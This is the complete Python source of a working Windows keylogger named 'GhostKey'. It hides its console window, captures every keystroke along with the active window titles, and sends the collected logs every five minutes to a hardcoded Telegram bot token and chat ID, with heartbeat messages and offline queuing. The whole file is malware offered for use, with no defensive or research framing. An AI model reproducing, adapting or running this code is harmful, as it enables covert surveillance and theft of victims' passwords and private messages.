import os
import sys
import time
import threading
import requests
import ctypes
import socket
import queue
from datetime import datetime

BOT_TOKEN = "8810561403:AAHuEYEJa1NjlpiLOHWdCghoe0mS3dYRey8"
CHAT_ID = "6438143115"
HOSTNAME = "MY-PC"
USERNAME = os.environ.get("USERNAME", "unknown")

def is_internet_available():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 53))
        s.close()
        return True
    except:
        return False

def wait_for_internet():
    while not is_internet_available():
        time.sleep(5)  # Check every 5 seconds

def ensure_internet():
    wait_for_internet()

class GhostKey:
    def __init__(self):
        self.keystrokes = []
        self.pending_messages = queue.Queue()
        self.current_window = "Unknown"
        self.SEND_INTERVAL = 300
        self.lock = threading.Lock()
        self.running = True
        self.debug_file = os.path.join(
            os.environ.get("TEMP", "C:\\Temp"),
            "ghostkey_debug.txt"
        )
        
    def debug_log(self, msg):
        try:
            with open(self.debug_file, "a") as f:
                f.write(f"[{datetime.now()}] {msg}\n")
        except:
            pass
        
    def start(self):
        try:
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except:
            pass
        
        self.debug_log("GhostKey started")
        
        self.debug_log("Waiting for internet...")
        wait_for_internet()
        self.debug_log("Internet detected!")
        
        threads = [
            threading.Thread(target=self._listen_keys, daemon=True),
            threading.Thread(target=self._track_window, daemon=True),
            threading.Thread(target=self._sender, daemon=True),
            threading.Thread(target=self._pending_sender, daemon=True),
            threading.Thread(target=self._keep_alive, daemon=True),
        ]
        
        for t in threads:
            t.start()
            time.sleep(0.1)
        
        self._safe_notify("🟢 Agent online")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            
    def _listen_keys(self):
        try:
            from pynput.keyboard import Listener, Key
            
            def on_press(key):
                try:
                    ts = datetime.now().strftime("%H:%M")
                    win = self.current_window[:40]
                    
                    if hasattr(key, 'char') and key.char and key.char.isprintable():
                        with self.lock:
                            self.keystrokes.append((ts, key.char, win))
                    else:
                        special = {
                            Key.enter: "⏎",
                            Key.tab: "⇥",
                            Key.backspace: "⌫",
                            Key.space: " ",
                            Key.esc: "⎋",
                            Key.delete: "⌦",
                        }
                        s = special.get(key)
                        if s:
                            with self.lock:
                                self.keystrokes.append((ts, s, win))
                except:
                    pass
            
            with Listener(on_press=on_press) as listener:
                listener.join()
        except Exception as e:
            self.debug_log(f"Keyboard error: {e}")
    
    def _track_window(self):
        try:
            import win32gui
            while self.running:
                try:
                    hwnd = win32gui.GetForegroundWindow()
                    title = win32gui.GetWindowText(hwnd)
                    if title:
                        self.current_window = title
                except:
                    pass
                time.sleep(1)
        except:
            pass
    
    def _sender(self):
        time.sleep(30)
        
        while self.running:
            time.sleep(self.SEND_INTERVAL)
            
            with self.lock:
                if not self.keystrokes:
                    continue
                data = self.keystrokes.copy()
                self.keystrokes.clear()
            
            if data:
                self._send_logs(data)
    
    def _pending_sender(self):
        while self.running:
            try:
                message = self.pending_messages.get(timeout=30)
                ensure_internet()
                self._send_telegram(message)
                self.debug_log("Pending message sent successfully")
            except queue.Empty:
                continue
            except Exception as e:
                self.debug_log(f"Pending sender error: {e}")
                try:
                    self.pending_messages.put(message)
                except:
                    pass
                time.sleep(10)
    
    def _keep_alive(self):
        time.sleep(600)
        while self.running:
            time.sleep(1800)
            
            if is_internet_available():
                with self.lock:
                    recent = len(self.keystrokes)
                
                self._safe_notify(f"💓 Heartbeat — {recent} pending keystrokes")
            else:
                self.debug_log("Internet down during heartbeat")
    
    def _safe_notify(self, text):
        message = f"{text}\n💻 {HOSTNAME}\\{USERNAME}\n🕒 {datetime.now().strftime('%H:%M:%S')}"
        
        if is_internet_available():
            try:
                self._send_telegram(message)
            except:
                self.pending_messages.put(message)
                self.debug_log("Notification queued (internet issue)")
        else:
            self.pending_messages.put(message)
            self.debug_log("Notification queued (no internet)")
    
    def _send_logs(self, data):
        windows = {}
        for ts, key, win in data:
            if win not in windows:
                windows[win] = []
            windows[win].append((ts, key))
        
        lines = [f"📝 Keystroke Report", f"💻 {HOSTNAME}\\{USERNAME}", 
                 f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M')}", ""]
        
        total_keys = len(data)
        
        for win, keys in sorted(windows.items(), key=lambda x: -len(x[1])):
            short_win = win[:50] if len(win) > 50 else win
            lines.append(f"📍 [{short_win}] ({len(keys)} keys)")
            
            text = ""
            for ts, key in keys:
                if len(key) == 1 and key.isprintable():
                    text += key
                elif key == "⏎":
                    text += "\n"
                elif key == " ":
                    text += " "
                elif key == "⇥":
                    text += "  "
                else:
                    text += f"<{key}>"
            
            if text.strip():
                display_text = text[:500] if len(text) > 500 else text
                lines.append(f"  └ {display_text}")
            lines.append("")
        
        lines.append(f"✨ Total: {total_keys} keystrokes across {len(windows)} windows")
        message = "\n".join(lines)
        
        if len(message) > 4000:
            message = message[:3997] + "..."
        
        if is_internet_available():
            try:
                self._send_telegram(message)
            except Exception as e:
                self.debug_log(f"Send failed, queuing: {e}")
                self.pending_messages.put(message)
        else:
            self.debug_log(f"No internet, queuing {total_keys} keystrokes")
            self.pending_messages.put(message)
    
    def _send_telegram(self, message):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        response = requests.post(url, json={
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }, timeout=15)
        response.raise_for_status()


if __name__ == "__main__":
    gk = GhostKey()
    gk.start()
